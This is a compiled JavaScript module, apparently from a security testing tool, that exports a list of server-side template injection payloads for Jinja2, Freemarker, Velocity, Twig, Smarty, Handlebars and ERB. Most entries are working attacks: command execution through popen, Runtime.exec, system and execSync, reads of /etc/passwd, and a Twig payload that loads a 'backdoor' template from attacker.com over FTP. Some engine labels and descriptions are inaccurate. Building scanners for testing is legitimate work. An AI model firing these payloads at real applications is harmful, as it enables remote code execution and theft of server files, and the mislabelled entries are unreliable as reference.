"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.TEMPLATE_INJECTION_PAYLOADS = void 0;
exports.getTemplateInjectionPayloads = getTemplateInjectionPayloads;
exports.TEMPLATE_INJECTION_PAYLOADS = [
    {
        payload: "{{7*7}}",
        description: "Jinja2 basic expression",
        severity: 'high',
        templateEngine: 'jinja2',
    },
    {
        payload: "${7*7}",
        description: "Jinja2 expression with $",
        severity: 'high',
        templateEngine: 'jinja2',
    },
    {
        payload: "{{config}}",
        description: "Jinja2 config object access",
        severity: 'critical',
        templateEngine: 'jinja2',
    },
    {
        payload: "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        description: "Jinja2 command execution",
        severity: 'critical',
        templateEngine: 'jinja2',
    },
    {
        payload: "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
        description: "Jinja2 file read via class hierarchy",
        severity: 'critical',
        templateEngine: 'jinja2',
    },
    {
        payload: "{{lipsum.__globals__['os'].popen('id').read()}}",
        description: "Jinja2 command execution via lipsum",
        severity: 'critical',
        templateEngine: 'jinja2',
    },
    {
        payload: "${7*7}",
        description: "Freemarker basic expression",
        severity: 'high',
        templateEngine: 'freemarker',
    },
    {
        payload: "#{7*7}",
        description: "Freemarker expression with #",
        severity: 'high',
        templateEngine: 'freemarker',
    },
    {
        payload: "${product.getClass().getProtectionDomain().getCodeSource().getLocation()}",
        description: "Freemarker class access",
        severity: 'critical',
        templateEngine: 'freemarker',
    },
    {
        payload: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        description: "Freemarker command execution",
        severity: 'critical',
        templateEngine: 'freemarker',
    },
    {
        payload: "#set($x=$class.forName('java.lang.Runtime').getRuntime().exec('id'))",
        description: "Velocity command execution",
        severity: 'critical',
        templateEngine: 'velocity',
    },
    {
        payload: "$class.forName('java.lang.Runtime').getRuntime().exec('id')",
        description: "Velocity runtime execution",
        severity: 'critical',
        templateEngine: 'velocity',
    },
    {
        payload: "{{7*7}}",
        description: "Twig basic expression",
        severity: 'high',
        templateEngine: 'twig',
    },
    {
        payload: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        description: "Twig command execution",
        severity: 'critical',
        templateEngine: 'twig',
    },
    {
        payload: "{{_self.env.setCache('ftp://attacker.com:2121')}}{{_self.env.loadTemplate('backdoor')}}",
        description: "Twig remote code execution",
        severity: 'critical',
        templateEngine: 'twig',
    },
    {
        payload: "{php}echo 'id';{/php}",
        description: "Smarty PHP tag execution",
        severity: 'critical',
        templateEngine: 'smarty',
    },
    {
        payload: "{self::getStreamVariable('file:///etc/passwd')}",
        description: "Smarty file read",
        severity: 'critical',
        templateEngine: 'smarty',
    },
    {
        payload: "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{#with string.split as |codelist|}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with \"\"}}{{#if conslist}}{{#with (string.sub.apply 0 codelist)}}{{this.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"id\")}}{{/with}}{{/if}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}",
        description: "Handlebars command execution",
        severity: 'critical',
        templateEngine: 'handlebars',
    },
    {
        payload: "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{#with string.split as |codelist|}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with \"\"}}{{#if conslist}}{{#with (string.sub.apply 0 codelist)}}{{this.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"id\")}}{{/with}}{{/if}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}",
        description: "Mustache command execution",
        severity: 'critical',
        templateEngine: 'mustache',
    },
    {
        payload: "<%= 7*7 %>",
        description: "ERB basic expression",
        severity: 'high',
        templateEngine: 'erb',
    },
    {
        payload: "<%= system('id') %>",
        description: "ERB command execution",
        severity: 'critical',
        templateEngine: 'erb',
    },
    {
        payload: "<%= File.read('/etc/passwd') %>",
        description: "ERB file read",
        severity: 'critical',
        templateEngine: 'erb',
    },
    {
        payload: "<%= `id` %>",
        description: "ERB command execution with backticks",
        severity: 'critical',
        templateEngine: 'erb',
    },
    {
        payload: "${7*7}",
        description: "Generic expression test",
        severity: 'medium',
        templateEngine: 'jinja2',
    },
    {
        payload: "#{7*7}",
        description: "Generic expression test with #",
        severity: 'medium',
        templateEngine: 'freemarker',
    },
    {
        payload: "{{7*7}}",
        description: "Generic expression test with {{}}",
        severity: 'medium',
        templateEngine: 'jinja2',
    },
];
function getTemplateInjectionPayloads(engine) {
    if (!engine) {
        return exports.TEMPLATE_INJECTION_PAYLOADS;
    }
    return exports.TEMPLATE_INJECTION_PAYLOADS.filter(p => p.templateEngine.toLowerCase() === engine.toLowerCase());
}
//# sourceMappingURL=template-injection.js.map